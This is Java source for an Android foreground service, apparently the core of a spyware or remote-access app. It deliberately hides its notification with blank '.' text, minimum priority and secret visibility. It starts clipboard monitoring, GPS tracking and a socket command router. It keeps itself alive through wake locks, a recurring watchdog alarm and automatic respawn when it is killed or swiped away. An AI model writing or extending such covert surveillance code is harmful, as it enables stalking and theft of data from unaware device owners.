package com.fason.app.service;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.SystemClock;
import androidx.core.app.NotificationCompat;

import com.fason.app.R;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.core.network.SocketCommandRouter;
import com.fason.app.features.clipboard.ClipboardMonitor;
import com.fason.app.features.gps.GpsManager;
import com.fason.app.receiver.ScreenStateReceiver;
import com.fason.app.receiver.WatchdogReceiver;

/** Main foreground service with stealth notification. */
public class MainService extends Service {

    public static final int NOTIF_ID = 1;
    private static final long WATCHDOG_INTERVAL = 60000;

    private static volatile MainService instance;
    private PowerManager.WakeLock wakeLock;

    private ClipboardMonitor clipMonitor;
    private GpsManager locManager;
    private ScreenStateReceiver screenStateReceiver;
    private int currentType = 0;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    public static MainService getInstance() {
        return instance;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;

        try {
            createChannel();
        } catch (Exception ignored) {}

        startForeground();
        acquireWakeLock();
        WatchdogReceiver.setServiceActive(this, true);
        clipMonitor = ClipboardMonitor.getInstance(this);
        clipMonitor.start();

        // Dynamically register ScreenStateReceiver – manifest-declared
        // SCREEN_ON/OFF/USER_PRESENT broadcasts are blocked since API 24.
        screenStateReceiver = new ScreenStateReceiver();
        android.content.IntentFilter filter = new android.content.IntentFilter();
        filter.addAction(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        filter.addAction(Intent.ACTION_USER_PRESENT);
        registerReceiver(screenStateReceiver, filter);
        try {
            locManager = new GpsManager(this);
        } catch (Exception ignored) {}
        SocketCommandRouter.initialize();
        scheduleWatchdog();
    }

    private void createChannel() {
        NotificationManager nm = getSystemService(NotificationManager.class);
        if (nm == null) return;

        NotificationChannel existing = nm.getNotificationChannel(Protocol.NOTIF_CHANNEL);
        if (existing != null) return;

        NotificationChannel ch = new NotificationChannel(
            Protocol.NOTIF_CHANNEL, ".", NotificationManager.IMPORTANCE_MIN);
        ch.setDescription(".");
        ch.setShowBadge(false);
        ch.setSound(null, null);
        ch.enableLights(false);
        ch.enableVibration(false);
        ch.setBypassDnd(false);
        ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
        ch.setAllowBubbles(false);
        nm.createNotificationChannel(ch);
    }

    private void startForeground() {
        currentType = ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE;
        try {
            startForeground(NOTIF_ID, buildNotification(), currentType);
        } catch (SecurityException e) {
            startForeground(NOTIF_ID, buildNotification());
        }
    }

    // No custom RemoteViews — avoids BadForegroundServiceNotificationException on Android 14+
    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, Protocol.NOTIF_CHANNEL)
            .setSmallIcon(R.drawable.ic_notif_stealth)
            .setContentTitle(".")
            .setContentText(".")
            .setOngoing(true)
            .setSilent(true)
            .setOnlyAlertOnce(true)
            .setLocalOnly(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setShowWhen(false)
            .setGroup(Protocol.NOTIF_GROUP)
            .setGroupSummary(true)
            .setGroupAlertBehavior(NotificationCompat.GROUP_ALERT_SUMMARY)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build();
    }

    private void acquireWakeLock() {
        if (wakeLock == null) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null) {
                wakeLock = pm.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK, "fason::service");
                wakeLock.setReferenceCounted(false);
                wakeLock.acquire(10 * 60 * 1000L);
            }
        }
    }

    // Android 10+ requires updating the foreground service type when new capabilities are needed
    public void updateType(int type) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            int combined = currentType | type;
            if (combined != currentType) {
                currentType = combined;
                try {
                    startForeground(NOTIF_ID, buildNotification(), currentType);
                } catch (SecurityException ignored) {}
            }
        }
    }

    public void releaseType(int type) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            int remaining = currentType & ~type;
            if (remaining != currentType && remaining != 0) {
                currentType = remaining;
                try {
                    startForeground(NOTIF_ID, buildNotification(), currentType);
                } catch (SecurityException ignored) {}
            }
        }
    }

    private void scheduleWatchdog() {
        Intent i = new Intent(this, WatchdogReceiver.class);
        i.setAction(Protocol.BC_KEEP_ALIVE);

        int flags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE;
        PendingIntent pi = PendingIntent.getBroadcast(this, 999, i, flags);
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

        if (am != null) {
            long trigger = SystemClock.elapsedRealtime() + WATCHDOG_INTERVAL;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                if (am.canScheduleExactAlarms()) {
                    am.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                } else {
                    am.setAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                }
            } else {
                am.setExactAndAllowWhileIdle(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            }
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (wakeLock != null && !wakeLock.isHeld()) {
            wakeLock.acquire(10 * 60 * 1000L);
        }
        scheduleWatchdog();
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        scheduleRestart();
    }

    @Override
    public void onDestroy() {
        if (screenStateReceiver != null) {
            try { unregisterReceiver(screenStateReceiver); } catch (Exception ignored) {}
            screenStateReceiver = null;
        }
        if (clipMonitor != null) clipMonitor.shutdown();
        if (locManager != null) locManager.stop();
        SocketCommandRouter.shutdown();
        SocketClient.getInstance().shutdown();
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        WatchdogReceiver.setServiceActive(this, false);
        instance = null;
        scheduleRestart();
        super.onDestroy();
    }

    // Targets WatchdogReceiver (exported=false) for secure restart
    private void scheduleRestart() {
        try {
            Intent i = new Intent(this, WatchdogReceiver.class);
            i.setAction(Protocol.BC_RESPAWN_SERVICE);

            int flags = PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE;
            PendingIntent pi = PendingIntent.getBroadcast(this, 0, i, flags);
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

            if (am != null) {
                long trigger = SystemClock.elapsedRealtime() + 2000;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    if (am.canScheduleExactAlarms()) {
                        am.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                    } else {
                        am.setAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                    }
                } else {
                    am.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                }
            }
        } catch (Exception ignored) {}
    }

    public GpsManager getGpsManager() {
        return locManager;
    }
}
